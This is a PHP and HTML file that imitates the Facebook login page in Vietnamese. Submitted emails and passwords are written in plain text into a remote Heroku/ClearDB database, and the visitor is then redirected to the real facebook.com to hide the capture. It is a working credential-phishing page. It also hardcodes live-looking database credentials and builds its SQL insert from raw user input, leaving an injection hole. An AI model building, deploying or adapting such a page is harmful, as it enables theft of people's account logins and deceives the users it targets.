<?php
$username = "b614a17f77afaa"; // Khai báo username
$password = "f6491cde";      // Khai báo password
$server   = "us-cdbr-east-06.cleardb.net";   // Khai báo server
$dbname   = "heroku_267bb0a4e81edfb";      // Khai báo database

// Kết nối database tintuc
$connect = new mysqli($server, $username, $password, $dbname);

//Nếu kết nối bị lỗi thì xuất báo lỗi và thoát.
if ($connect->connect_error) {
    die("Không kết nối :" . $conn->connect_error);
    exit();
}

//Khai báo giá trị ban đầu, nếu không có thì khi chưa submit câu lệnh insert sẽ báo lỗi
$email = "";
$password = "";


//Lấy giá trị POST từ form vừa submit
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(isset($_POST["email"])) { $email = $_POST['email']; }
    if(isset($_POST["password"])) { $password = $_POST['password']; }
    

    //Code xử lý, insert dữ liệu vào table
    $sql = "INSERT INTO `antoan_user` (email, password) VALUES ('$email', '$password')";

    if ($connect->query($sql) === TRUE) {
      $facebook_url = "https://www.facebook.com/";
      echo '<script>window.location.href="'.$facebook_url.'";</script>';
      exit;
    } else {
        echo "Error: " . $sql . "<br>" . $connect->error;
    }
}
//Đóng database
$connect->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./style.css">
    <title>Document</title>
</head>
<body>
    <div class="box">
        <div class="title-box">
          <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
          <p>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
        </div>
        <div class="form-box">
          <form action="" method="post">
            <input type="text" name="email" placeholder="Email hoặc số điện thoại">
            <input type="password" name="password" placeholder="Mật khẩu">
            <button class="login" type="submit">Đăng nhập</button>
            <a href="#">Quên mật khẩu</a>
          </form>
          <hr>
          <div class="create-btn">
            <a href="https://youtu.be/Lcw8t9vTpQI" target="_blank">Tạo tài khoản mới</a>
          </div>
        </div>
      </div>
</body>
</html>